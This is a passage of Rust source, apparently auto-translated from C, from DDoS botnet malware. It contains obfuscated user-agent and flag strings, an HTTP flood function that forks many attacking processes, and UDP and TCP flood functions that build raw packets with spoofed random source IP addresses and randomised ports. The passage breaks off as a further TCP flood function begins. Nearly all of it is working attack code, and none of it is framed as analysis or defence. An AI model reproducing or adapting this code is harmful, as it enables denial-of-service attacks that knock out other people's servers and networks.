        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1B\x19\x1Ee\xB9\xFFQB4\xDA\x1E\xBC4\x19\x1Ee\xB9\xFFQ4\tF4\xEBP\xB4\x86\xB4\xEB4<\x19xQ4b\x90\xCE4\tF4^\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'*P\x86\x97o\x97*4\x1BL\xC3\xB0b\\\xEC4<\x19xQ4\xD7Q\xCEx\xB9\xD34b\xB9\xD2\x19<Q'\xEBo\xCD\x86G\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1Bw\x19\xFFa\xB9Z\x034\xD9\xB04*\x97\xE2B4w\x19\xFF*oB4\xC1*o\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'\xCF\xE2G\x97\xE2*4\x1BL\xC3\xB0b\\\xEC4<\x19xQ4\xD7Q\xCEx\xB9\xD34\xDAe\xE7\xB9\xD4Q'*P\x97P\x97\xE2\xEB\xEB\x86\x97\xEB\xEB\xE24F\x90u\x90\xE7\x19'\xCF\xE2G\x97\xE2*\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1B\\\x19\xFF\xE4\xC1B4\xA4\xFFa\xE7\xB9\x19a4\xCF\x97PB4\xC3\xBC\xA4w\x9Dh4\xD76\xA4\xDC\\P\xD045\xE4\x19<a'\xC3\xBC\xA4w\x9Dh\xD76\xA4\xDC\\P\xD0\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'\xCF\xE2G\x97\xE2*4\x1BL\xC3\xB0b\\\xEC4<\x19xQ4\xD7Q\xCEx\xB9\xD34\x1CQ\xE7\x03\x19\xB9\xFF'o\x97P4\xDAe\xE7\xB9\xD4Q'\xE2G\x97P\x97P\x97P4b\xB9\xD2\x19<Q4F\x90u\x90\xE7\x19'\xCF\xE2G\x97\xE2*\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1Bw\x19\xFFa\xB9Z\x034\xD9\xB04\xEBP\x97PB4w\x19\xFF*oB4\xC1*o\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'\xCF\xE2G\x97\xE2*4\x1BL\xC3\xB0b\\\xEC4<\x19xQ4\xD7Q\xCEx\xB9\xD34\xDAe\xE7\xB9\xD4Q'\xCF*\x97P\x97\x86\xD0\x86o\x97\x9AG4F\x90u\x90\xE7\x19'\xCF\xE2G\x97\xE2*\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1Bw\x19\xFFa\xB9Z\x034\xD9\xB04*\x97\xEBB4w\x19\xFF*oB4\xC1*o\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'\xCF\xE2G\x97\xE2*4\x1BL\xC3\xB0b\\\xEC4<\x19xQ4\xD7Q\xCEx\xB9\xD34\xDAe\xE7\xB9\xD4Q'*\xEB\x97P\x97\xE2\xEB*\xE2\x97\xEBPP4F\x90u\x90\xE7\x19'\xCF\xE2G\x97\xE2*\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P\x1B\x19\x1E\x90aB4\xBCB4\xDA\x1E\xBC4\x19\x1Ee\xB9\xFFQ4\tF4\xE2\xB4\x864<\x19xQ4b\x90\xCE4\tF4^B4Q\xFF\xDC\xE4\x03\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'\xCF\xE2\xEB\x97\x86\xEB\x97\xEBP4\x1BL\xC3\xB0b\\\xEC4<\x19xQ4\xD7Q\xCEx\xB9\xD34\x1CQ\xE7\x03\x19\xB9\xFF'o\x97P\x97o4b\xB9\xD2\x19<Q'G5\xE2\xEBo4F\x90u\x90\xE7\x19'\xCF\xE2\xEB\x97\x86\xEB\x97\xEBP\xF9\x19\xFF\xB4<\x19\xD2\x97\xCE\xCE\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\xD7\x90<Q\xB9\xFF'\xEB\x97\x86\x97\xD04\x1B^\xEB\xEBB4\\\x19\xFF\xE4\xC14\x19*\x9A*B4\xBCB\xD34\xD7Q\xCEx\xB9'\x86PP\x86\xEB\x86\xEB\xE24\xCDQ\xD2\x19\x90\xFF'\xEB\x97\x86\x97\xD0\xDCP\x97\xD2\xE4\xFFx\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4F<\x90\xCExZ\x90\xE7Q'\xEB\xE2\x97\xE2G4\x1B^\xEB\xEBB4\xBCB4\\\x19\xFF\xE4\xC14\xC1\x9A*\xB4*oB4Q\xFF\xDC\xBCF\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'\xCF\xE2\xCF\x97\xEB4\x1BL\xC3\xB0b\\\xEC4<\x19xQ4\xD7Q\xCEx\xB9\xD34\xDAe\xE7\xB9\xD4Q'\xEB\xE2\x97P\x97G\x9A\x86\x97o\xEB\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1B\xCE\xB9\xD4\xA0\x909\x19\xD2<QB4\x19\xDA\x90\xD24\xE2\x97P\x97\xE2B4b\x90\xCE\x19\xFF9\xB9\x03eB4\xBCB4\x1E\x1E\xDA4b\x90\xCE4\tF\xD3\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\t\xA0Q\xE7\x90'\xD0\x97\x9AP4\x1B\xB3\x86b\x9D'bh\xCD\x1EB4\t\xA0Q\xE7\x904b\x19\xFF\x19'\xCF\x97P4\x1Bw\x19\xFFa\xB9Z\x03B4\xBCB4w\x19\xFFa\xB9Z\x034\xD9\xB04\xCF\x97\xEBB4Q\xFF\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'\x9A\x9A*B4\xBCB4Q\xFF\xD34\x1E\xE7Q\x039\xB9'\x86\x97o\x97\xEB\xCFb\xB9>\x19<<\x90'\xCF\x97P4\x1Bw\x19\xFFa\xB9Z\x034\xD9\xB04\xEBP\x97PB4w\tw*oB4\xE7\xFC\xF1o\x9A\x97P\xD34\xD7Q\xCEx\xB9'\x86P\xEBPP\xEBP\xEB4\x14\x19\xE7Qu\xB9\xC1'o\x9A\x97P\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1B^\xEB\xEBB4\xBCB4\\\x19\xFF\xE4\xC14\xA0\xA0\xCEB4Q\xFF\xDC\xBCFB4\xE7\xFC\xF1\xEB\x97\xD0\x90\x9A\xD34\xD7Q\xCEx\xB9'\x86PPG\xEBPP*\x86P4\xD7\xE7\x90\xFF\x1E\x90\xE7\x90a\x19\x03\xB9'\xE2\x97\xEB\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1B\xCE\xB9\xD4\xA0\x909\x19\xD2<QB4\xBCB4\xA45\xE7\xB9Z\x03Q4P\x97*B4F\"<<\x90\xD2<Q\xD34\xA4\xA0\xA0<QwQ\xD2L\x199'o\x86P\xE94\x1BL\xC3\xB0b\\\xEC4<\x19xQ4\xD7Q\xCEx\xB9\xD3\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1Bb\x90\xCE\x19\xFF9\xB9\x03eB4\xBCB4h\xFF9Q<4b\x90\xCE4\tF4^B4Q\xFFB4\xE7\xFC\xF1\xEB\x97\x9A\x97\xEB\x97\xEB\xEB\xD34\xD7Q\xCEx\xB9'\x86PPG\xEB\xEB\x86\x9A4\xDA\x90\xD4\x19\xFF\xB9'\xEB\x97\xCF\x97o\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1Bw\x19\xFFa\xB9Z\x03B4\xBCB4w\x19\xFFa\xB9Z\x034\xD9\xB04*\x97\xEBB4\xE7\xFC\xF1\x86\x97\x86\xD34\xD7Q\xCEx\xB9'\x86P\xEB\xEBP\x86P\xEB\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1B^\xEB\xEBB4\xBCB4\\\x19\xFF\xE4\xC14\x19*\x9A*B4\xA0<\xDC\x1E\\B4\xE7\xFC\xF1\xEB\x97\xD0\x97P\x97*\xD34\xD7Q\xCEx\xB9'\x86PP\xD0P\x86P\xD0\xEB\xEB\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1Bw\x19\xFFa\xB9Z\x03B4\xBCB4w\x19\xFFa\xB9Z\x034\xD9\xB04*\x97\xEBB4\xCE\x03B4\xE7\xFC\xF1\xEB\x97\xD0\x97\x86\x97*\xD34\xD7Q\xCEx\xB9'\x86P\xEBPP*\x86\x9A4\xD4\"\x19\xD2\xE7\xB9Z'o\x90<\xA0e\x90\x86\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'o\x97P4\x1B\xCE\xB9\xD4\xA0\x909\x19\xD2<QB4bFh\x9D4G\x97PB4w\x19\xFFa\xB9Z\x034\xD9\xB04*\x97PB4b\"h\x9D\x86B4F\\\xDA\xDA\xEBB4\x97\xD9\x9D\xB04\xDA\\64\x86\x97P\x97\xCFPG\x86GB4bQa\x19\x904\xDAQ\xFF9Q\xE74\x1E\xDA4\xCF\x97P\xD3\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1Bw\x19\xFFa\xB9Z\x03B4\xBCB4w\x19\xFF4\xD0\xC14o\x97\xD0PB4F\xD7B4\xE7\xFC\xF1\xEB\x97\xD0\x97\x86\x97o\xD34\xD7Q\xCEx\xB9'\x86P\xEBP\xEB\xEBPo4\xD9Q9\x03\xCE\x90\xA0Q'\xD0\x97\xEB\x97P\x86\x9A\xCF\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1B^\xEB\xEBB4\xBCB4\\\x19\xFF\xE4\xC14\x19*\x9A*B4Q\xFF\xDC\xBCFB4\xE7\xFC\xF1\xEB\x97\xD0\x97P\x97\x9A\xD34\xD7Q\xCEx\xB9'\x86PP\xD0P\xE2\x86G4\xD7\x90<Q\xB9\xFF'\x86\x97P\x97G\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1B\x1E\\\xA4\x80F\xB0\xA4\xB0h\t\xD94\xE2B4\xE2\x97\xCF\xCF\xD3\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1B^\xEB\xEBB4\\\x19\xFF\xE4\xC14\xC1\x9A*\xB4*oB4\xE7\xFC\xF1\xE2\x9A\x97P\xD34\xD7Q\xCEx\xB9'\x86P\xEBPP\xEBP\xEB4\xB0e\xE4\xFFaQ\xE7\xD2\x19\xE7a'\xE2\x9A\x97\x86\x97P4\\\x19\xF9e9\xFF\x19\xFF\xF9'o\x97P\x97\x86\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"b\xB9>\x19<<\x90'\xCF\x97P4\x1Bw\x19\xFFa\xB9Z\x034\xD9\xB04*\x97\xEBB4w\tw*o\xD34Fx\"\xA0Q\xBC\xE7\x19\x1E\xE7Q\xFC\x19QZ4\x1E\xE7Q\xFC\x19QZ'P\x97\xCF\0"
        as *const u8 as *const libc::c_char as *mut libc::c_char,
];
#[no_mangle]
pub unsafe extern "C" fn sendHTTP(
    mut method: *mut libc::c_char,
    mut host: *mut libc::c_char,
    mut port: uint16_t,
    mut path: *mut libc::c_char,
    mut timeFoo: libc::c_int,
    mut power: libc::c_int,
) {
    let mut connections: [*const libc::c_char; 3] = [
        b"close\0" as *const u8 as *const libc::c_char,
        b"keep-alive\0" as *const u8 as *const libc::c_char,
        b"accept\0" as *const u8 as *const libc::c_char,
    ];
    let mut i_0: libc::c_int = 0;
    let mut timeEnd: libc::c_int = (time(0 as *mut time_t) + timeFoo as libc::c_long)
        as libc::c_int;
    let mut request: [libc::c_char; 2048] = [0; 2048];
    sprintf(
        request.as_mut_ptr(),
        b"%s %s HTTP/1.1\r\nConnection: %s\r\n%s: %s\r\n\r\n\0" as *const u8
            as *const libc::c_char,
        method,
        path,
        connections[(rand() % 3 as libc::c_int) as usize],
        eika(
            b"\xBC\x03Q\xE7\xDC\xA4\xF9Q\xFF9\0" as *const u8 as *const libc::c_char
                as *mut libc::c_char,
        ),
        eika(
            useragents[(rand() as libc::c_ulong)
                .wrapping_rem(
                    (::std::mem::size_of::<[*mut libc::c_char; 32]>() as libc::c_ulong)
                        .wrapping_div(
                            ::std::mem::size_of::<*mut libc::c_char>() as libc::c_ulong,
                        ),
                ) as usize],
        ),
    );
    i_0 = 0 as libc::c_int;
    while i_0 < power {
        if fork() != 0 {
            while timeEnd as libc::c_long > time(0 as *mut time_t) {
                let mut sock: libc::c_int = socket_connect(host, port);
                if sock != 0 as libc::c_int {
                    write(
                        sock,
                        request.as_mut_ptr() as *const libc::c_void,
                        strlen(request.as_mut_ptr()),
                    );
                    close(sock);
                }
            }
            _exit(1 as libc::c_int);
        }
        i_0 += 1;
    }
}
#[no_mangle]
pub static mut LOCAL_ADDR: uint32_t = 0;
#[no_mangle]
pub unsafe extern "C" fn sendUDP(
    mut target: *mut libc::c_uchar,
    mut port: libc::c_int,
    mut timeEnd: libc::c_int,
    mut spoofit: libc::c_int,
    mut packetsize: libc::c_int,
    mut pollinterval: libc::c_int,
    mut sleepcheck: libc::c_int,
    mut sleeptime: libc::c_int,
) {
    let mut dest_addr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    dest_addr.sin_family = 2 as libc::c_int as sa_family_t;
    if port == 0 as libc::c_int {
        dest_addr.sin_port = rand_cmwc() as in_port_t;
    } else {
        dest_addr
            .sin_port = ((port as libc::c_ushort as libc::c_int & 0xff as libc::c_int)
            << 8 as libc::c_int
            | (port as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
                >> 8 as libc::c_int) as in_port_t;
    }
    if getHost(target, &mut dest_addr.sin_addr) != 0 {
        return;
    }
    memset(
        (dest_addr.sin_zero).as_mut_ptr() as *mut libc::c_void,
        '\0' as i32,
        ::std::mem::size_of::<[libc::c_uchar; 8]>() as libc::c_ulong,
    );
    let mut pollRegister: libc::c_uint = 0;
    pollRegister = pollinterval as libc::c_uint;
    if spoofit == 32 as libc::c_int {
        let mut sockfd: libc::c_int = socket(
            2 as libc::c_int,
            SOCK_DGRAM as libc::c_int,
            IPPROTO_UDP as libc::c_int,
        );
        if sockfd == 0 {
            return;
        }
        let mut buf: *mut libc::c_uchar = malloc(
            (packetsize + 1 as libc::c_int) as libc::c_ulong,
        ) as *mut libc::c_uchar;
        if buf.is_null() {
            return;
        }
        memset(
            buf as *mut libc::c_void,
            0 as libc::c_int,
            (packetsize + 1 as libc::c_int) as libc::c_ulong,
        );
        RandBytes(buf, packetsize);
        let mut end: libc::c_int = (time(0 as *mut time_t) + timeEnd as libc::c_long)
            as libc::c_int;
        let mut i_0: libc::c_uint = 0 as libc::c_int as libc::c_uint;
        let mut ii: libc::c_uint = 0 as libc::c_int as libc::c_uint;
        loop {
            sendto(
                sockfd,
                buf as *const libc::c_void,
                packetsize as size_t,
                0 as libc::c_int,
                &mut dest_addr as *mut sockaddr_in as *mut sockaddr,
                ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong as socklen_t,
            );
            if i_0 == pollRegister {
                if port == 0 as libc::c_int {
                    dest_addr.sin_port = rand_cmwc() as in_port_t;
                }
                if time(0 as *mut time_t) > end as libc::c_long {
                    break;
                }
                i_0 = 0 as libc::c_int as libc::c_uint;
            } else {
                i_0 = i_0.wrapping_add(1);
                if ii == sleepcheck as libc::c_uint {
                    usleep((sleeptime * 1000 as libc::c_int) as __useconds_t);
                    ii = 0 as libc::c_int as libc::c_uint;
                } else {
                    ii = ii.wrapping_add(1);
                }
            }
        }
    } else {
        let mut sockfd_0: libc::c_int = socket(
            2 as libc::c_int,
            SOCK_RAW as libc::c_int,
            IPPROTO_UDP as libc::c_int,
        );
        if sockfd_0 == 0 {
            return;
        }
        let mut tmp: libc::c_int = 1 as libc::c_int;
        if setsockopt(
            sockfd_0,
            IPPROTO_IP as libc::c_int,
            3 as libc::c_int,
            &mut tmp as *mut libc::c_int as *const libc::c_void,
            ::std::mem::size_of::<libc::c_int>() as libc::c_ulong as socklen_t,
        ) < 0 as libc::c_int
        {
            return;
        }
        let mut counter: libc::c_int = 50 as libc::c_int;
        loop {
            let fresh55 = counter;
            counter = counter - 1;
            if !(fresh55 != 0) {
                break;
            }
            srand(
                (time(0 as *mut time_t) ^ rand_cmwc() as libc::c_long
                    ^ getpid() as libc::c_long) as libc::c_uint,
            );
            init_rand(
                (time(0 as *mut time_t) ^ rand_cmwc() as libc::c_long
                    ^ getpid() as libc::c_long) as uint32_t,
            );
        }
        let mut netmask: in_addr_t = 0;
        if spoofit == 0 as libc::c_int {
            netmask = !(-(1 as libc::c_int) as in_addr_t);
        } else {
            netmask = !(((1 as libc::c_int) << 32 as libc::c_int - spoofit)
                - 1 as libc::c_int) as in_addr_t;
        }
        let vla = (::std::mem::size_of::<iphdr>() as libc::c_ulong)
            .wrapping_add(::std::mem::size_of::<udphdr>() as libc::c_ulong)
            .wrapping_add(packetsize as libc::c_ulong) as usize;
        let mut packet: Vec::<libc::c_uchar> = ::std::vec::from_elem(0, vla);
        let mut iph: *mut iphdr = packet.as_mut_ptr() as *mut iphdr;
        let mut udph: *mut udphdr = (iph as *mut libc::c_void)
            .offset(::std::mem::size_of::<iphdr>() as libc::c_ulong as isize)
            as *mut udphdr;
        makeIPPacket(
            iph,
            dest_addr.sin_addr.s_addr,
            ((GetRandomIP(netmask) as libc::c_ulong
                & 0xff as libc::c_int as libc::c_ulong) << 24 as libc::c_int
                | (GetRandomIP(netmask) as libc::c_ulong
                    & 0xff00 as libc::c_int as libc::c_ulong) << 8 as libc::c_int
                | (GetRandomIP(netmask) as libc::c_ulong
                    & 0xff0000 as libc::c_int as libc::c_ulong) >> 8 as libc::c_int
                | (GetRandomIP(netmask) as libc::c_ulong
                    & 0xff000000 as libc::c_uint as libc::c_ulong) >> 24 as libc::c_int)
                as uint32_t,
            IPPROTO_UDP as libc::c_int as uint8_t,
            (::std::mem::size_of::<udphdr>() as libc::c_ulong)
                .wrapping_add(packetsize as libc::c_ulong) as libc::c_int,
        );
        (*udph)
            .len = (((::std::mem::size_of::<udphdr>() as libc::c_ulong)
            .wrapping_add(packetsize as libc::c_ulong) as libc::c_ushort as libc::c_int
            & 0xff as libc::c_int) << 8 as libc::c_int
            | ((::std::mem::size_of::<udphdr>() as libc::c_ulong)
                .wrapping_add(packetsize as libc::c_ulong) as libc::c_ushort
                as libc::c_int & 0xff00 as libc::c_int) >> 8 as libc::c_int) as uint16_t;
        (*udph).source = rand_cmwc() as uint16_t;
        (*udph)
            .dest = (if port == 0 as libc::c_int {
            rand_cmwc()
        } else {
            ((port as libc::c_ushort as libc::c_int & 0xff as libc::c_int)
                << 8 as libc::c_int
                | (port as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
                    >> 8 as libc::c_int) as libc::c_uint
        }) as uint16_t;
        (*udph).check = 0 as libc::c_int as uint16_t;
        RandString(
            (udph as *mut libc::c_uchar)
                .offset(::std::mem::size_of::<udphdr>() as libc::c_ulong as isize),
            packetsize,
        );
        (*iph)
            .check = csum(
            packet.as_mut_ptr() as *mut libc::c_ushort,
            (*iph).tot_len as libc::c_int,
        );
        let mut end_0: libc::c_int = (time(0 as *mut time_t) + timeEnd as libc::c_long)
            as libc::c_int;
        let mut i_1: libc::c_uint = 0 as libc::c_int as libc::c_uint;
        let mut ii_0: libc::c_uint = 0 as libc::c_int as libc::c_uint;
        loop {
            (*udph).source = rand_cmwc() as uint16_t;
            (*udph)
                .dest = (if port == 0 as libc::c_int {
                rand_cmwc()
            } else {
                ((port as libc::c_ushort as libc::c_int & 0xff as libc::c_int)
                    << 8 as libc::c_int
                    | (port as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
                        >> 8 as libc::c_int) as libc::c_uint
            }) as uint16_t;
            (*iph).id = rand_cmwc() as uint16_t;
            (*iph)
                .saddr = ((GetRandomIP(netmask) as libc::c_ulong
                & 0xff as libc::c_int as libc::c_ulong) << 24 as libc::c_int
                | (GetRandomIP(netmask) as libc::c_ulong
                    & 0xff00 as libc::c_int as libc::c_ulong) << 8 as libc::c_int
                | (GetRandomIP(netmask) as libc::c_ulong
                    & 0xff0000 as libc::c_int as libc::c_ulong) >> 8 as libc::c_int
                | (GetRandomIP(netmask) as libc::c_ulong
                    & 0xff000000 as libc::c_uint as libc::c_ulong) >> 24 as libc::c_int)
                as uint32_t;
            (*iph)
                .check = csum(
                packet.as_mut_ptr() as *mut libc::c_ushort,
                (*iph).tot_len as libc::c_int,
            );
            if i_1 == pollRegister {
                if time(0 as *mut time_t) > end_0 as libc::c_long {
                    break;
                }
                i_1 = 0 as libc::c_int as libc::c_uint;
            } else {
                i_1 = i_1.wrapping_add(1);
                if ii_0 == sleepcheck as libc::c_uint {
                    usleep((sleeptime * 1000 as libc::c_int) as __useconds_t);
                    ii_0 = 0 as libc::c_int as libc::c_uint;
                } else {
                    ii_0 = ii_0.wrapping_add(1);
                }
            }
        }
    };
}
#[no_mangle]
pub unsafe extern "C" fn ovtcp(
    mut target: *mut libc::c_uchar,
    mut port: libc::c_int,
    mut timeEnd: libc::c_int,
    mut spoofit: libc::c_int,
    mut flags: *mut libc::c_uchar,
    mut packetsize: libc::c_int,
    mut pollinterval: libc::c_int,
) {
    let mut pollRegister: libc::c_uint = 0;
    pollRegister = pollinterval as libc::c_uint;
    let mut dest_addr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    dest_addr.sin_family = 2 as libc::c_int as sa_family_t;
    if port == 0 as libc::c_int {
        dest_addr.sin_port = rand_cmwc() as in_port_t;
    } else {
        dest_addr
            .sin_port = ((port as libc::c_ushort as libc::c_int & 0xff as libc::c_int)
            << 8 as libc::c_int
            | (port as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
                >> 8 as libc::c_int) as in_port_t;
    }
    if getHost(target, &mut dest_addr.sin_addr) != 0 {
        return;
    }
    memset(
        (dest_addr.sin_zero).as_mut_ptr() as *mut libc::c_void,
        '\0' as i32,
        ::std::mem::size_of::<[libc::c_uchar; 8]>() as libc::c_ulong,
    );
    let mut sockfd: libc::c_int = socket(
        2 as libc::c_int,
        SOCK_RAW as libc::c_int,
        IPPROTO_TCP as libc::c_int,
    );
    if sockfd == 0 {
        return;
    }
    let mut tmp: libc::c_int = 1 as libc::c_int;
    if setsockopt(
        sockfd,
        IPPROTO_IP as libc::c_int,
        3 as libc::c_int,
        &mut tmp as *mut libc::c_int as *const libc::c_void,
        ::std::mem::size_of::<libc::c_int>() as libc::c_ulong as socklen_t,
    ) < 0 as libc::c_int
    {
        return;
    }
    let mut netmask: in_addr_t = 0;
    if spoofit == 0 as libc::c_int {
        netmask = !(-(1 as libc::c_int) as in_addr_t);
    } else {
        netmask = !(((1 as libc::c_int) << 32 as libc::c_int - spoofit)
            - 1 as libc::c_int) as in_addr_t;
    }
    let vla = (::std::mem::size_of::<iphdr>() as libc::c_ulong)
        .wrapping_add(::std::mem::size_of::<tcphdr>() as libc::c_ulong)
        .wrapping_add(packetsize as libc::c_ulong) as usize;
    let mut packet: Vec::<libc::c_uchar> = ::std::vec::from_elem(0, vla);
    let mut iph: *mut iphdr = packet.as_mut_ptr() as *mut iphdr;
    let mut tcph: *mut tcphdr = (iph as *mut libc::c_void)
        .offset(::std::mem::size_of::<iphdr>() as libc::c_ulong as isize) as *mut tcphdr;
    makeIPPacket(
        iph,
        dest_addr.sin_addr.s_addr,
        ((GetRandomIP(netmask) as libc::c_ulong & 0xff as libc::c_int as libc::c_ulong)
            << 24 as libc::c_int
            | (GetRandomIP(netmask) as libc::c_ulong
                & 0xff00 as libc::c_int as libc::c_ulong) << 8 as libc::c_int
            | (GetRandomIP(netmask) as libc::c_ulong
                & 0xff0000 as libc::c_int as libc::c_ulong) >> 8 as libc::c_int
            | (GetRandomIP(netmask) as libc::c_ulong
                & 0xff000000 as libc::c_uint as libc::c_ulong) >> 24 as libc::c_int)
            as uint32_t,
        IPPROTO_TCP as libc::c_int as uint8_t,
        (::std::mem::size_of::<tcphdr>() as libc::c_ulong)
            .wrapping_add(packetsize as libc::c_ulong) as libc::c_int,
    );
    (*tcph).source = rand_cmwc() as uint16_t;
    (*tcph).seq = rand_cmwc();
    (*tcph).ack_seq = 0 as libc::c_int as uint32_t;
    (*tcph).set_doff(5 as libc::c_int as uint16_t);
    if strcmp(
        flags as *const libc::c_char,
        okic(b"7~~\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
    ) == 0
    {
        (*tcph).set_syn(1 as libc::c_int as uint16_t);
        (*tcph).set_rst(1 as libc::c_int as uint16_t);
        (*tcph).set_fin(1 as libc::c_int as uint16_t);
        (*tcph).set_ack(1 as libc::c_int as uint16_t);
        (*tcph).set_psh(1 as libc::c_int as uint16_t);
    } else {
        let mut pch: *mut libc::c_uchar = strtok(
            flags as *mut libc::c_char,
            b"-\0" as *const u8 as *const libc::c_char,
        ) as *mut libc::c_uchar;
        while !pch.is_null() {
            if strcmp(
                pch as *const libc::c_char,
                okic(b"6p,\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
            ) == 0
            {
                (*tcph).set_syn(1 as libc::c_int as uint16_t);
            } else if strcmp(
                pch as *const libc::c_char,
                okic(b"v6c\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
            ) == 0
            {
                (*tcph).set_rst(1 as libc::c_int as uint16_t);
            } else if strcmp(
                pch as *const libc::c_char,
                okic(b"dx,\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
            ) == 0
            {
                (*tcph).set_fin(1 as libc::c_int as uint16_t);
            } else if strcmp(
                pch as *const libc::c_char,
                okic(b"7DU\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
            ) == 0
            {
                (*tcph).set_ack(1 as libc::c_int as uint16_t);
            } else if strcmp(
                pch as *const libc::c_char,
                okic(b"|6e\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
            ) == 0
            {
                (*tcph).set_psh(1 as libc::c_int as uint16_t);
            } else {
                return
            }
            pch = strtok(
                0 as *mut libc::c_char,
                b",\0" as *const u8 as *const libc::c_char,
            ) as *mut libc::c_uchar;
        }
    }
    (*tcph).window = rand_cmwc() as uint16_t;
    (*tcph).check = 0 as libc::c_int as uint16_t;
    (*tcph).urg_ptr = 0 as libc::c_int as uint16_t;
    (*tcph)
        .dest = (if port == 0 as libc::c_int {
        rand_cmwc()
    } else {
        ((port as libc::c_ushort as libc::c_int & 0xff as libc::c_int)
            << 8 as libc::c_int
            | (port as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
                >> 8 as libc::c_int) as libc::c_uint
    }) as uint16_t;
    (*tcph).check = tcpcsum(iph, tcph);
    (*iph)
        .check = csum(
        packet.as_mut_ptr() as *mut libc::c_ushort,
        (*iph).tot_len as libc::c_int,
    );
    let mut end: libc::c_int = (time(0 as *mut time_t) + timeEnd as libc::c_long)
        as libc::c_int;
    let mut i_0: libc::c_uint = 0 as libc::c_int as libc::c_uint;
    let mut sleepdep: libc::c_int = rand() % 2500000 as libc::c_int
        + 500000 as libc::c_int;
    loop {
        sendto(
            sockfd,
            packet.as_mut_ptr() as *const libc::c_void,
            (vla * ::std::mem::size_of::<libc::c_uchar>()) as libc::c_ulong,
            0 as libc::c_int,
            &mut dest_addr as *mut sockaddr_in as *mut sockaddr,
            ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong as socklen_t,
        );
        (*iph)
            .saddr = ((GetRandomIP(netmask) as libc::c_ulong
            & 0xff as libc::c_int as libc::c_ulong) << 24 as libc::c_int
            | (GetRandomIP(netmask) as libc::c_ulong
                & 0xff00 as libc::c_int as libc::c_ulong) << 8 as libc::c_int
            | (GetRandomIP(netmask) as libc::c_ulong
                & 0xff0000 as libc::c_int as libc::c_ulong) >> 8 as libc::c_int
            | (GetRandomIP(netmask) as libc::c_ulong
                & 0xff000000 as libc::c_uint as libc::c_ulong) >> 24 as libc::c_int)
            as uint32_t;
        (*iph).id = rand_cmwc() as uint16_t;
        (*tcph).seq = rand_cmwc();
        (*tcph).source = rand_cmwc() as uint16_t;
        (*tcph).check = 0 as libc::c_int as uint16_t;
        (*tcph).check = tcpcsum(iph, tcph);
        (*iph)
            .check = csum(
            packet.as_mut_ptr() as *mut libc::c_ushort,
            (*iph).tot_len as libc::c_int,
        );
        if i_0 == pollRegister {
            if time(0 as *mut time_t) > end as libc::c_long {
                break;
            }
            i_0 = 0 as libc::c_int as libc::c_uint;
        } else {
            i_0 = i_0.wrapping_add(1);
            usleep(sleepdep as __useconds_t);
            if sleepdep <= 0 as libc::c_int {
                continue;
            }
            sleepdep = sleepdep - 250000 as libc::c_int;
        }
    };
}
#[no_mangle]
pub unsafe extern "C" fn ftcp(
    mut target: *mut libc::c_uchar,
    mut port: libc::c_int,
    mut timeEnd: libc::c_int,
    mut spoofit: libc::c_int,
